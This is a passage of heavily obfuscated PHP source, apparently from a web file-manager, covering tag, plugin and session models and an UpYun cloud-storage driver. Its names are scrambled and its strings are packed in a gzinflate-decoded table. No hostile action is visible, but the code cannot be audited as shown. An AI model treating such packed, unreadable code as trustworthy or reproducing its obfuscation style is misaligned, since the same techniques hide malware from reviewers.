$this->iconvSystem($•ŠÙÁˆ¹); if ($òø¸œÇÖ === !1) { $òø¸œÇÖ = $this->size($•ŠÙÁˆ¹); } if ($òø¸œÇÖ <= 0) { return $ÚëîÁØõ[12]; } $­ÌÕ¹« = fopen($•ŠÙÁˆ¹, $ÚëîÁØõ[1454]); if (!$­ÌÕ¹«) { return !1; } fseek_64($­ÌÕ¹«, $åìÄÉ§î); $À¯£Ì¶ = fread($­ÌÕ¹«, $òø¸œÇÖ); fclose($­ÌÕ¹«); if (!$À¯£Ì¶) { $this->writeLog(__FUNCTION__ . $ÚëîÁØõ[1445], !0); } return $À¯£Ì¶; } public function upload($‹­·àº“, $Ô»ş«ê›, $áÊ÷Ëè× = false, $Ğñ—ñÉŞ = REPEAT_REPLACE) { if ($áÊ÷Ëè×) { return $this->moveFile($Ô»ş«ê›, $‹­·àº“); } return $this->copyFile($Ô»ş«ê›, $‹­·àº“); } public function setModifyTime($ˆÉºèŠ, $ Ó†»ïÆ = '') { @touch($ˆÉºèŠ, intval($ Ó†»ïÆ)); } public function download($À¾´‹îí, $º™øüŠã) { return $this->iconvSystem($À¾´‹îí); } } goto cƒàÏ“ÉÒ; Bàã›®Ò˜ù: define($_SERVER[÷åé¼î][0], $_SERVER[÷åé¼î][1]); $_SERVER[Ğœßİ½¶] = explode($_SERVER[÷åé¼î][2], gzinflate(substr($_SERVER[÷åé¼î][3], 10, -8))); function binCheckEq($÷‚…Êûû, $ì”ü¸¸ø) { return $÷‚…Êûû == $ì”ü¸¸ø; } goto cÉêîßõË¼; Aï½‘ë®ŞÅ: class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\145\x72\137\146\141\166"; protected function cacheFunctionAlias($ŸÔßöñ) { $İê’¬Œà =& $_SERVER[÷åé¼î]; return array($İê’¬Œà[2090] => array($ŸÔßöñ[0], $İê’¬Œà[2091]), $İê’¬Œà[2092] => array($ŸÔßöñ[0], $İê’¬Œà[2093])); } protected function get($æÁËñ£§) { $ãÈö³ßË =& $_SERVER[÷åé¼î]; $úöìœ•³ = Model($ãÈö³ßË[569])->metaGet($æÁËñ£§, $ãÈö³ßË[2094]); $˜šÖ­ñ¢ = json_decode($úöìœ•³, !0); return $˜šÖ­ñ¢ ? $˜šÖ­ñ¢ : array($ãÈö³ßË[2095] => $ãÈö³ßË[91], $ãÈö³ßË[429] => array()); } protected function set($„çŒÂ§ã, $‰×ÏÙÛ±) { $ÈÆˆÇæ =& $_SERVER[÷åé¼î]; $‰×ÏÙÛ± = $‰×ÏÙÛ± ? $‰×ÏÙÛ± : array($ÈÆˆÇæ[2095] => $ÈÆˆÇæ[91], $ÈÆˆÇæ[429] => array()); return Model($ÈÆˆÇæ[569])->metaSet($„çŒÂ§ã, $ÈÆˆÇæ[2094], json_encode($‰×ÏÙÛ±)); } protected function getByTagID($„õñ¦ËŸ, $Êú™çê) { $²¬®€¬¦ =& $_SERVER[÷åé¼î]; if (!$„õñ¦ËŸ || !$Êú™çê) { return !1; } if (!Model($²¬®€¬¦[569])->getInfoSimple($„õñ¦ËŸ)) { return !1; } $ÖõûäÕÆ = $this->get($„õñ¦ËŸ); if (!$ÖõûäÕÆ || !isset($ÖõûäÕÆ[$²¬®€¬¦[429]])) { return !1; } $ô¡„áÇü = array_find_by_field($ÖõûäÕÆ[$²¬®€¬¦[429]], $²¬®€¬¦[459], $Êú™çê); return is_array($ô¡„áÇü) ? $ô¡„áÇü : !1; } public function listSource($Ö‘óñ˜Ô, $çÍ•ÒÄ¨) { $±‚—»Ÿ =& $_SERVER[÷åé¼î]; if ($çÍ•ÒÄ¨ && !is_array($çÍ•ÒÄ¨)) { $çÍ•ÒÄ¨ = array($çÍ•ÒÄ¨); } $§ÍêíÀ = $this->listData($Ö‘óñ˜Ô); $Üó²¡”» = array(); foreach ($§ÍêíÀ as $æ«Ø—Á…) { $ĞÓî„•É = $æ«Ø—Á…[$±‚—»Ÿ[87]]; if (!$ĞÓî„•É) { continue; } if (!isset($Üó²¡”»[$ĞÓî„•É])) { $Üó²¡”»[$ĞÓî„•É] = array(); } $Üó²¡”»[$ĞÓî„•É][] = $æ«Ø—Á…[$±‚—»Ÿ[484]]; } $£óÇåĞğ = array(); foreach ($Üó²¡”» as $¤áæµŠš => $µ¬Âêš) { $şÛŒĞé = !0; if (!$çÍ•ÒÄ¨) { $£óÇåĞğ[] = $¤áæµŠš; continue; } foreach ($çÍ•ÒÄ¨ as $–…¤õˆĞ) { if (!in_array($–…¤õˆĞ, $µ¬Âêš)) { $şÛŒĞé = !1; break; } } if ($şÛŒĞé) { $£óÇåĞğ[] = $¤áæµŠš; } } if (!$£óÇåĞğ) { return array(); } $ü¿šÈ‰ = array($±‚—»Ÿ[475] => array($±‚—»Ÿ[476], $£óÇåĞğ), $±‚—»Ÿ[553] => $Ö‘óñ˜Ô, $±‚—»Ÿ[190] => SourceModel::TYPE_GROUP); $Ùå¦èí… = Model($±‚—»Ÿ[1414])->listSource($ü¿šÈ‰); if (!$Ùå¦èí… || count($£óÇåĞğ) == $Ùå¦èí…[$±‚—»Ÿ[426]][$±‚—»Ÿ[427]]) { return $Ùå¦èí…; } $¶Ò÷¯‘ = array(); $‘ÈÀÔ·¨ = array_to_keyvalue($Ùå¦èí…[$±‚—»Ÿ[85]], $±‚—»Ÿ[12], $±‚—»Ÿ[193]); $¯½É™¡£ = array_to_keyvalue($Ùå¦èí…[$±‚—»Ÿ[86]], $±‚—»Ÿ[12], $±‚—»Ÿ[193]); $…¹·Ø‚¤ = array_merge($¯½É™¡£, $‘ÈÀÔ·¨); foreach ($£óÇåĞğ as $ĞÓî„•É) { if (!in_array($ĞÓî„•É, $…¹·Ø‚¤)) { $¶Ò÷¯‘[] = $ĞÓî„•É; } } if ($¶Ò÷¯‘) { $this->removeBySource($Ö‘óñ˜Ô, $¶Ò÷¯‘); } return $Ùå¦èí…; } protected function listData($›†™ÆÇ´) { $Ğ¾¤Ì´µ =& $_SERVER[÷åé¼î]; $–²Ñ¥’« = array($Ğ¾¤Ì´µ[1770] => 0, $Ğ¾¤Ì´µ[541] => array($Ğ¾¤Ì´µ[2096], 0), $Ğ¾¤Ì´µ[480] => $Ğ¾¤Ì´µ[2097] . $›†™ÆÇ´); $¿»´¢£ş = $Ğ¾¤Ì´µ[2098]; $¹ğ­œ¼¦ = $this->field($¿»´¢£ş)->where($–²Ñ¥’«)->order($Ğ¾¤Ì´µ[2099])->select(); return $¹ğ­œ¼¦ ? $¹ğ­œ¼¦ : array(); } protected function addToTag($¤öÆ…¹Ø, $¢à›¸Û¶, $İ‡˜‘í) { $‘‘˜¾× =& $_SERVER[÷åé¼î]; if (!$this->getByTagID($¤öÆ…¹Ø, $İ‡˜‘í) || !$¢à›¸Û¶) { return !1; } if (!Model($‘‘˜¾×[889])->pathInfo($¢à›¸Û¶)) { return !1; } $ÊÃç‡Æ“ = array($‘‘˜¾×[1770] => 0, $‘‘˜¾×[541] => $İ‡˜‘í, $‘‘˜¾×[479] => $¢à›¸Û¶, $‘‘˜¾×[480] => $‘‘˜¾×[2100] . $¤öÆ…¹Ø, $‘‘˜¾×[478] => $‘‘˜¾×[12], $‘‘˜¾×[1981] => 0); if ($this->where($ÊÃç‡Æ“)->find()) { return !1; } return $this->add($ÊÃç‡Æ“); } protected function removeFromTag($ØÍÚƒúÙ, $çË¥êø, $ˆ·”Èäó) { $ï¤¹¯Ïë =& $_SERVER[÷åé¼î]; if (!$this->getByTagID($ØÍÚƒúÙ, $ˆ·”Èäó) || !$çË¥êø) { return !1; } if (is_array($çË¥êø)) { $çË¥êø = array($ï¤¹¯Ïë[7], $çË¥êø); } $™™Õ•Æë = array($ï¤¹¯Ïë[1770] => 0, $ï¤¹¯Ïë[541] => $ˆ·”Èäó, $ï¤¹¯Ïë[480] => $ï¤¹¯Ïë[2100] . $ØÍÚƒúÙ, $ï¤¹¯Ïë[479] => $çË¥êø); return $this->where($™™Õ•Æë)->delete(); } protected function removeByTag($š¥…³õä, $š¶¾åÏ›) { $úØˆŞüî =& $_SERVER[÷åé¼î]; if (!$this->getByTagID($š¥…³õä, $š¶¾åÏ›)) { return !1; } $‘®Óƒ÷Š = array($úØˆŞüî[1770] => 0, $úØˆŞüî[541] => $š¶¾åÏ›, $úØˆŞüî[480] => $úØˆŞüî[2100] . $š¥…³õä); return $this->where($‘®Óƒ÷Š)->delete(); } protected function removeBySource($øè·¥Œñ, $÷µ¯à„‚) { $Ùõ•…ˆè =& $_SERVER[÷åé¼î]; if (!$øè·¥Œñ || !$÷µ¯à„‚) { return !1; } if (is_array($÷µ¯à„‚)) { $÷µ¯à„‚ = array($Ùõ•…ˆè[7], $÷µ¯à„‚); } $ØÙ˜è‰¯ = array($Ùõ•…ˆè[1770] => 0, $Ùõ•…ˆè[479] => $÷µ¯à„‚, $Ùõ•…ˆè[541] => array($Ùõ•…ˆè[1086], 0), $Ùõ•…ˆè[480] => $Ùõ•…ˆè[2100] . $øè·¥Œñ); return $this->where($ØÙ˜è‰¯)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\x6d\x2e\x70\154\165\147\151\156\x4c\151\163\x74"; public $field = array("\156\141\155\x65", "\163\x74\x61\x74\165\x73", "\x72\x65\147\x69\145\x73\x74", "\x63\x6f\156\146\x69\147"); public function loadList($äÉòëÂ¦ = false) { $Ş…ó½§Ã = array_to_keyvalue($this->listData(), $_SERVER[÷åé¼î][32]); if ($äÉòëÂ¦) { return $Ş…ó½§Ã[$äÉòëÂ¦]; } return $Ş…ó½§Ã; } public function init() { $ù…Õˆ™ =& $_SERVER[÷åé¼î]; Hook::trigger($ù…Õˆ™[2101]); $Ï™¡­à = $this->loadPluginList(); foreach ($Ï™¡­à as $Ş­¯›æ => $—ƒ¦”¥¹) { $ŠÊŞ„à‚ = $this->appAllow($Ş­¯›æ, $—ƒ¦”¥¹); if (!$ŠÊŞ„à‚) { continue; } foreach ($—ƒ¦”¥¹[$ù…Õˆ™[2102]] as $íÒŒæ => $¤·¥†­) { Hook::bind($íÒŒæ, $¤·¥†­); } } Hook::trigger($ù…Õˆ™[2103]); Hook::trigger(ACTION); } public function appAllow($Î¦–¤Ü›, $­ŠİÑôÌ, $ïòïŸ§â = true) { $Ü ÅÍåñ =& $_SERVER[÷åé¼î]; $Ğ¼‚şõ‡ = PLUGIN_DIR . $Î¦–¤Ü› . $Ü ÅÍåñ[2104]; if (!is_array($­ŠİÑôÌ) || !is_array($­ŠİÑôÌ[$Ü ÅÍåñ[2102]]) || $­ŠİÑôÌ[$Ü ÅÍåñ[815]] != 1 || !is_file($Ğ¼‚şõ‡)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$Ü ÅÍåñ[6]][$Ü ÅÍåñ[2105]] || !$GLOBALS[$Ü ÅÍåñ[6]][$Ü ÅÍåñ[2106]]) { return !0; } $ÏÆ»Æı = explode($Ü ÅÍåñ[50], strtolower($GLOBALS[$Ü ÅÍåñ[6]][$Ü ÅÍåñ[2106]])); return in_array(strtolower($Î¦–¤Ü›), $ÏÆ»Æı) ? !1 : !0; } if ($ïòïŸ§â && !Action($Ü ÅÍåñ[2107])->checkAuth($Î¦–¤Ü›)) { return !1; } return !0; } public function unInstall($âŞ£ëÍç) { $Ø‡©•–¿ =& $_SERVER[÷åé¼î]; $È›€½°î = $this->loadList($âŞ£ëÍç); if (file_exists(PLUGIN_DIR . $âŞ£ëÍç)) { Hook::apply($âŞ£ëÍç . $Ø‡©•–¿[2108]); } $this->remove($È›€½°î[$Ø‡©•–¿[459]]); } public function changeStatus($Ğé§Â½ä, $ı¶äÀÏ€) { $ïñ÷ııí =& $_SERVER[÷åé¼î]; $«Úš«ñ™ = $this->loadList($Ğé§Â½ä); if ($ı¶äÀÏ€) { Hook::apply($Ğé§Â½ä . $ïñ÷ııí[2109]); } $this->update($«Úš«ñ™[$ïñ÷ııí[459]], array($ïñ÷ııí[2110] => $ı¶äÀÏ€)); } public function appRegist($Ş¢—‡—Ê, $ÖíŞÉá­) { $èÀª•½  =& $_SERVER[÷åé¼î]; $óß±¸ŞÙ = $this->loadList($Ş¢—‡—Ê); if ($óß±¸ŞÙ) { $this->update($óß±¸ŞÙ[$èÀª•½ [459]], array($èÀª•½ [2102] => $ÖíŞÉá­)); } else { $Õ×çîØ¢ = array($èÀª•½ [32] => $Ş¢—‡—Ê, $èÀª•½ [2102] => $ÖíŞÉá­, $èÀª•½ [815] => 0, $èÀª•½ [6] => $this->getConfigDefault($Ş¢—‡—Ê)); $this->insert($Õ×çîØ¢); } } public function getConfigDefault($ÉÂÓó‘¦) { $ÇôÚÙÈù =& $_SERVER[÷åé¼î]; $ûõ±Â†ø = array(); $²¨Ñ×ëß = $this->getPackageJson($ÉÂÓó‘¦); if (!$²¨Ñ×ëß && is_array($²¨Ñ×ëß[$ÇôÚÙÈù[2111]])) { return $ûõ±Â†ø; } foreach ($²¨Ñ×ëß[$ÇôÚÙÈù[2111]] as $É°èöÀ¬ => $ìéÇÁíŸ) { if (!isset($ìéÇÁíŸ[$ÇôÚÙÈù[434]]) || isset($ûõ±Â†ø[$É°èöÀ¬])) { continue; } $ûõ±Â†ø[$É°èöÀ¬] = $ìéÇÁíŸ[$ÇôÚÙÈù[434]]; } return $ûõ±Â†ø; } public function getPackageJson($“¶·«) { return Hook::apply($“¶·« . $_SERVER[÷åé¼î][2112]); } public function getConfig($ÓŞ×·ş, $‹Ç»§Ê‚ = false) { $¨€®ïìñ =& $_SERVER[÷åé¼î]; $şê°€¢ = array(); $àà¯ŠÉØ = $this->loadList($ÓŞ×·ş); if ($àà¯ŠÉØ && is_array($àà¯ŠÉØ[$¨€®ïìñ[6]])) { $şê°€¢ = $àà¯ŠÉØ[$¨€®ïìñ[6]]; } if (!$şê°€¢ || $‹Ç»§Ê‚) { $şê°€¢ = $this->getConfigDefault($ÓŞ×·ş); } return $şê°€¢; } public function setConfig($ÈûÎ‚ê, $¦äÙ¬øå = false) { $±‰˜€‰Ğ =& $_SERVER[÷åé¼î]; $É·¼êÌş = $this->loadList($ÈûÎ‚ê); if (!$É·¼êÌş) { return !1; } $©ŸäÌüĞ = $É·¼êÌş[$±‰˜€‰Ğ[6]]; if ($¦äÙ¬øå == !1) { $©ŸäÌüĞ = array(); $¦äÙ¬øå = $this->getConfigDefault($ÈûÎ‚ê); } foreach ($¦äÙ¬øå as $÷”¼æ« => $¦ƒ’À­—) { $©ŸäÌüĞ[$÷”¼æ«] = is_string($¦ƒ’À­—) ? trim($¦ƒ’À­—) : $¦ƒ’À­—; } $this->update($É·¼êÌş[$±‰˜€‰Ğ[459]], array($±‰˜€‰Ğ[6] => $©ŸäÌüĞ)); } public function viewList() { $ß¡‹è¡— =& $_SERVER[÷åé¼î]; $”³¿ï…Ç = $this->loadList(); $this->pluginScan($”³¿ï…Ç); $”³¿ï…Ç = $this->loadPluginList(); $È±Ìı¤­ = array(); foreach ($”³¿ï…Ç as $Û’•»‚ => $ı¥ƒ¦Ÿ‡) { $¿ß°½ü¾ = $ı¥ƒ¦Ÿ‡; unset($ı¥ƒ¦Ÿ‡[$ß¡‹è¡—[2102]], $ı¥ƒ¦Ÿ‡[$ß¡‹è¡—[6]]); $Ö‚óû« = PLUGIN_DIR . $ı¥ƒ¦Ÿ‡[$ß¡‹è¡—[32]] . $ß¡‹è¡—[2104]; if (!is_file($Ö‚óû«)) { continue; } $ÒÌÚã”ä = Hook::apply($ı¥ƒ¦Ÿ‡[$ß¡‹è¡—[32]] . $ß¡‹è¡—[2112]); if (!is_array($ÒÌÚã”ä)) { continue; } $È±Ìı¤­[$Û’•»‚] = array_merge($ı¥ƒ¦Ÿ‡, $ÒÌÚã”ä); if ($¿ß°½ü¾[$ß¡‹è¡—[6]][$ß¡‹è¡—[1693]] != $ÒÌÚã”ä[$ß¡‹è¡—[1667]]) { Hook::apply($ı¥ƒ¦Ÿ‡[$ß¡‹è¡—[32]] . $ß¡‹è¡—[2109]); $¿ß°½ü¾[$ß¡‹è¡—[6]][$ß¡‹è¡—[1693]] = $ÒÌÚã”ä[$ß¡‹è¡—[1667]]; $this->update($ı¥ƒ¦Ÿ‡[$ß¡‹è¡—[459]], array($ß¡‹è¡—[6] => $¿ß°½ü¾[$ß¡‹è¡—[6]])); } } return $È±Ìı¤­; } private function loadPluginList() { $öä°ëşÛ =& $_SERVER[÷åé¼î]; $´˜æßÊÆ = $this->loadList(); if (strtolower(MOD) == $öä°ëşÛ[2113]) { return $´˜æßÊÆ; } $™Ÿ‡”½Ò = Hook::trigger($öä°ëşÛ[2114], $´˜æßÊÆ); if ($´˜æßÊÆ && !$™Ÿ‡”½Ò) { die; } return $™Ÿ‡”½Ò ? $™Ÿ‡”½Ò : $´˜æßÊÆ; } private function pluginScan($ââ×“î±) { $ƒ›êŒ«º =& $_SERVER[÷åé¼î]; recursion_dir(PLUGIN_DIR, $ Î°³•—, $Åùè´óÒ, 0); foreach ($ Î°³•— as $¾ã‡¾ÖÔ) { $ß‰¿Øõ° = get_path_this($¾ã‡¾ÖÔ); if (isset($ââ×“î±[$ß‰¿Øõ°]) || !file_exists($¾ã‡¾ÖÔ . $ƒ›êŒ«º[2115]) || !file_exists($¾ã‡¾ÖÔ . $ƒ›êŒ«º[2104])) { continue; } Hook::apply($ß‰¿Øõ° . $ƒ›êŒ«º[2109]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\x79\163\164\145\x6d\x5f\163\x65\x73\x73\151\157\156"; public function get($ÕßŠ‹‹·) { $Ä•·¹ÃÊ =& $_SERVER[÷åé¼î]; $’¸ğ´ï = $this->where(array($Ä•·¹ÃÊ[2116] => $ÕßŠ‹‹·))->find(); if (!is_array($’¸ğ´ï)) { return !1; } return $’¸ğ´ï[$Ä•·¹ÃÊ[171]]; } public function set($˜Ä¢¯±‡, $øÁ¡ğÒ, $Û±ÌóõŞ = 3600) { $¥áÖ¼îá =& $_SERVER[÷åé¼î]; $€ºî‰„ = array($¥áÖ¼îá[2116] => $˜Ä¢¯±‡, $¥áÖ¼îá[2016] => $øÁ¡ğÒ, $¥áÖ¼îá[2117] => $Û±ÌóõŞ + time()); if (Session::get($¥áÖ¼îá[2118])) { $€ºî‰„[$¥áÖ¼îá[1779]] = Session::get($¥áÖ¼îá[2118]); } else { $€ºî‰„[$¥áÖ¼îá[1779]] = 0; } if ($this->get($˜Ä¢¯±‡)) { return $this->where(array($¥áÖ¼îá[2116] => $˜Ä¢¯±‡))->save($€ºî‰„); } else { return $this->add($€ºî‰„, array(), !0); } } public function remove($áÇ¸ë©ñ) { return $this->where(array($_SERVER[÷åé¼î][2116] => $áÇ¸ë©ñ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[÷åé¼î][2119] . time())->delete(); } } goto CÏº•ç©œÚ; dĞƒÎ§¥½¢: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\164\x70\72\57\x2f\x76\x30\56\x61\160\x69\56\x75\160\171\x75\156\x2e\x63\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($ËÓıÕ÷ø) { parent::__construct(); $this->_init($ËÓıÕ÷ø); } public function _init($„¼‡úÒœ) { $Ï˜¯À¼ =& $_SERVER[÷åé¼î]; foreach ($„¼‡úÒœ as $ìëÁ™˜ => $¿«í¯Õé) { if (isset($this->{$ìëÁ™˜})) { $this->{$ìëÁ™˜} = $¿«í¯Õé; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($Ï˜¯À¼[1554] . LNG($Ï˜¯À¼[1460])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($Ä¼Ïşˆ, $°Ãëï½  = "\x47\x45\x54") { $åˆ¨ËàŠ =& $_SERVER[÷åé¼î]; $¥Úí¸œù = gmdate($åˆ¨ËàŠ[1491]); $øÑ‰õ˜è = base64_encode(hash_hmac($åˆ¨ËàŠ[1555], "{$°Ãëï½ }\46{$Ä¼Ïşˆ}\46{$¥Úí¸œù}", md5("{$this->userpass}"), !0)); $¾ôô»ê™ = array("\x41\x75\164\150\157\x72\151\172\x61\164\x69\157\156\72\125\x50\131\125\116\40{$this->username}\72{$øÑ‰õ˜è}", "\104\x61\164\145\x3a{$¥Úí¸œù}"); return $¾ôô»ê™; } public function ussRequest($£—µí—Ç, $–ªáõ¯¯ = "\107\105\124", $ÑÂ½òí° = false, $Êôƒ›ã¯ = false, $êÕË°æ = false) { $æóè°ú« =& $_SERVER[÷åé¼î]; $£—µí—Ç = trim($£—µí—Ç, $æóè°ú«[8]); $‡’€§Ó = "\57{$this->bucket}\x2f{$£—µí—Ç}"; $øØ¤çó‚ = $this->ussHeaders($‡’€§Ó, $–ªáõ¯¯); if ($Êôƒ›ã¯) { $øØ¤çó‚ = array_merge($øØ¤çó‚, $Êôƒ›ã¯); } $€ï†’­ = url_request($this->endpoint . $‡’€§Ó, $–ªáõ¯¯, $ÑÂ½òí°, $øØ¤çó‚, $êÕË°æ); if (!$€ï†’­) { $ç„°œ¬´ = LNG($æóè°ú«[1556]); $this->writeLog($ç„°œ¬´); return array($æóè°ú«[1291] => !1, $æóè°ú«[1281] => $ç„°œ¬´); } if (strtolower($–ªáõ¯¯) == $æóè°ú«[227] || in_array($€ï†’­[$æóè°ú«[1291]], array($æóè°ú«[274], $æóè°ú«[1557]))) { $ÑÂ½òí° = $€ï†’­[$æóè°ú«[1558]]; } else { $ÑÂ½òí° = json_decode($€ï†’­[$æóè°ú«[1281]], !0); if (!$ÑÂ½òí°) { $ÑÂ½òí° = $€ï†’­[$æóè°ú«[1281]]; } else { if (!$€ï†’­[$æóè°ú«[815]] && isset($ÑÂ½òí°[$æóè°ú«[1559]])) { $ÑÂ½òí° = $ÑÂ½òí°[$æóè°ú«[1559]]; } } } if (!$€ï†’­[$æóè°ú«[815]]) { $this->writeLog($this->__errorMessage($ÑÂ½òí°)); } return array($æóè°ú«[1291] => $€ï†’­[$æóè°ú«[815]], $æóè°ú«[1281] => $ÑÂ½òí°); } private function __errorMessage($ï«‹ÖÏê) { $‰Ù¼Ó× =& $_SERVER[÷åé¼î]; if (!$ï«‹ÖÏê) { return $‰Ù¼Ó×[12]; } static $‰ÏıáÉ = null; if (!$‰ÏıáÉ) { $‰ÏıáÉ = I18n::getType(); } if ($‰ÏıáÉ != $‰Ù¼Ó×[1501]) { return $ï«‹ÖÏê; } $ÒÔ£©§€ = array($‰Ù¼Ó×[1560] => $‰Ù¼Ó×[1561], $‰Ù¼Ó×[1562] => $‰Ù¼Ó×[1563], $‰Ù¼Ó×[1564] => $‰Ù¼Ó×[1563], $‰Ù¼Ó×[1565] => $‰Ù¼Ó×[1566], $‰Ù¼Ó×[1567] => $‰Ù¼Ó×[1568], $‰Ù¼Ó×[1569] => $‰Ù¼Ó×[1570], $‰Ù¼Ó×[1571] => $‰Ù¼Ó×[1572]); return isset($ÒÔ£©§€[$ï«‹ÖÏê]) ? $ÒÔ£©§€[$ï«‹ÖÏê] : $ï«‹ÖÏê; } public function mkfile($§É¥—˜â, $Š¯ÃÖÌ = '', $·¾Ù¡±¾ = REPEAT_RENAME) { if ($this->setContent($§É¥—˜â, $Š¯ÃÖÌ)) { return $this->getPathOuter($§É¥—˜â); } return !1; } public function mkdir($óşä›à, $Æ†¿±é¤ = REPEAT_SKIP) { $êÃšÒ»‚ =& $_SERVER[÷åé¼î]; $àÜ¾Á ® = trim($óşä›à, $êÃšÒ»‚[8]); if ($this->_isFolder($àÜ¾Á ®)) { return $this->getPathOuter($àÜ¾Á ®); } $Ïƒ‰Àîİ = array($êÃšÒ»‚[1573]); $Œ¥ıÇªŸ = $this->ussRequest($àÜ¾Á ®, $êÃšÒ»‚[257], !1, $Ïƒ‰Àîİ); return $Œ¥ıÇªŸ[$êÃšÒ»‚[1291]] ? $this->getPathOuter($àÜ¾Á ®) : !1; } public function copyFile($›ä·şÁ, $™ÖôÀà¹) { $ˆÜÏ‡˜ =& $_SERVER[÷åé¼î]; $Ì¢ ÆÖ = array($ˆÜÏ‡˜[1574] . "\x2f{$this->bucket}\57{$›ä·şÁ}", $ˆÜÏ‡˜[1575]); $Ò“ŒË®ğ = $this->ussRequest($™ÖôÀà¹, $ˆÜÏ‡˜[259], !1, $Ì¢ ÆÖ); return $Ò“ŒË®ğ[$ˆÜÏ‡˜[1291]] ? !0 : $this->getPathOuter($™ÖôÀà¹); } public function moveFile($İŒæí§ñ, $Åƒ«¨•£) { $®„íˆ¿Á =& $_SERVER[÷åé¼î]; $¸”ççÖº = array($®„íˆ¿Á[1576] . "\x2f{$this->bucket}\57{$İŒæí§ñ}", $®„íˆ¿Á[1575]); $´¸á™Î = $this->ussRequest($Åƒ«¨•£, $®„íˆ¿Á[259], !1, $¸”ççÖº); return $´¸á™Î[$®„íˆ¿Á[1291]] ? !0 : $this->getPathOuter($Åƒ«¨•£); } public function delFile($¾»Í¡Û‘) { $Í®¼ö“š =& $_SERVER[÷åé¼î]; $à©¼íáÏ = $this->ussRequest($¾»Í¡Û‘, $Í®¼ö“š[1577]); return $à©¼íáÏ[$Í®¼ö“š[1291]] ? !0 : !1; } public function delFolder($Ššñ¥¢ü) { $–­É¢· =& $_SERVER[÷åé¼î]; if (!$this->exist($Ššñ¥¢ü)) { return !0; } $this->listItemCache = !1; $¼Ú©Ê¬ê = $ÆÄ¶ = array(); $this->fileList($Ššñ¥¢ü, $¼Ú©Ê¬ê, $ÆÄ¶, !0); $this->listItemCache = !0; foreach ($ÆÄ¶ as $ïÜÜŞÂ) { $ÄÏåÆïœ = $this->ussRequest($ïÜÜŞÂ[$–­É¢·[32]], $–­É¢·[1577]); if (!$ÄÏåÆïœ[$–­É¢·[1291]]) { return !1; } } foreach ($¼Ú©Ê¬ê as $Ş²“¼şÛ) { $ÄÏåÆïœ = $this->ussRequest($Ş²“¼şÛ, $–­É¢·[1577]); if (!$ÄÏåÆïœ[$–­É¢·[1291]]) { return !1; } } $ÄÏåÆïœ = $this->ussRequest($Ššñ¥¢ü, $–­É¢·[1577]); return $ÄÏåÆïœ[$–­É¢·[1291]]; } public function rename($ÅêëıÕú, $Ô›’²ï§) { if ($this->isFile($ÅêëıÕú)) { $Ô›’²ï§ = get_path_father($ÅêëıÕú) . $Ô›’²ï§; return $this->moveFile($ÅêëıÕú, $Ô›’²ï§); } return $this->renameObject($ÅêëıÕú, $Ô›’²ï§); } public function fileInfo($«Ò‰ğßş, $»ÆÏ®·ô = false, $Ñğû—ŒÚ = array()) { $æ¥Á¸‚§ =& $_SERVER[÷åé¼î]; $İ‰±×ø– = array($æ¥Á¸‚§[32] => $this->pathThis($«Ò‰ğßş), $æ¥Á¸‚§[87] => $this->getPathOuter($æ¥Á¸‚§[8] . $«Ò‰ğßş), $æ¥Á¸‚§[33] => $æ¥Á¸‚§[230], $æ¥Á¸‚§[79] => isset($Ñğû—ŒÚ[$æ¥Á¸‚§[79]]) ? $Ñğû—ŒÚ[$æ¥Á¸‚§[79]] : 0, $æ¥Á¸‚§[169] => $this->ext($«Ò‰ğßş)); if ($»ÆÏ®·ô) { return $İ‰±×ø–; } $İ‰±×ø–[$æ¥Á¸‚§[231]] = $İ‰±×ø–[$æ¥Á¸‚§[88]] = 0; $İ‰±×ø–[$æ¥Á¸‚§[232]] = $İ‰±×ø–[$æ¥Á¸‚§[233]] = !0; if (empty($Ñğû—ŒÚ)) { $Ñğû—ŒÚ = $this->objectMeta($«Ò‰ğßş); if (!$Ñğû—ŒÚ) { return $İ‰±×ø–; } } $İ‰±×ø–[$æ¥Á¸‚§[231]] = intval($Ñğû—ŒÚ[$æ¥Á¸‚§[1578]]); $İ‰±×ø–[$æ¥Á¸‚§[88]] = intval($Ñğû—ŒÚ[$æ¥Á¸‚§[1579]]); $İ‰±×ø–[$æ¥Á¸‚§[79]] = $Ñğû—ŒÚ[$æ¥Á¸‚§[79]]; return $İ‰±×ø–; } public function folderInfo($ŒÂ¸Ä€, $ÃÏ‡ïÁ» = false) { $â…½§¡¨ =& $_SERVER[÷åé¼î]; $Ç•¥¯áò = array($â…½§¡¨[32] => $this->pathThis($ŒÂ¸Ä€), $â…½§¡¨[87] => $this->getPathOuter($â…½§¡¨[8] . $ŒÂ¸Ä€), $â…½§¡¨[33] => $â…½§¡¨[78]); if ($ÃÏ‡ïÁ») { return $Ç•¥¯áò; } $Ç•¥¯áò[$â…½§¡¨[231]] = $Ç•¥¯áò[$â…½§¡¨[88]] = 0; $Ç•¥¯áò[$â…½§¡¨[232]] = $Ç•¥¯áò[$â…½§¡¨[233]] = !0; if (empty($ÃÃô±Ô)) { $ÃÃô±Ô = $this->objectMeta($ŒÂ¸Ä€); if (!$ÃÃô±Ô) { return $Ç•¥¯áò; } } $Ç•¥¯áò[$â…½§¡¨[231]] = intval($ÃÃô±Ô[$â…½§¡¨[1578]]); $Ç•¥¯áò[$â…½§¡¨[88]] = intval($ÃÃô±Ô[$â…½§¡¨[1579]]); return $Ç•¥¯áò; } private function listObjs($šÌ¾²š©, $İÛÌ°˜Í = 0, $ªÆ•§ì„ = 1000) { $ƒ¥·Ã¤¶ =& $_SERVER[÷åé¼î]; $Å×™‰±ƒ = array($ƒ¥·Ã¤¶[1580], $ƒ¥·Ã¤¶[1581] . $ªÆ•§ì„); if ($İÛÌ°˜Í) { $Å×™‰±ƒ[] = $ƒ¥·Ã¤¶[1582] . $İÛÌ°˜Í; } $€¹ŸÁº’ = $this->ussRequest($šÌ¾²š©, $ƒ¥·Ã¤¶[261], !1, $Å×™‰±ƒ); return !$€¹ŸÁº’[$ƒ¥·Ã¤¶[1291]] ? !1 : 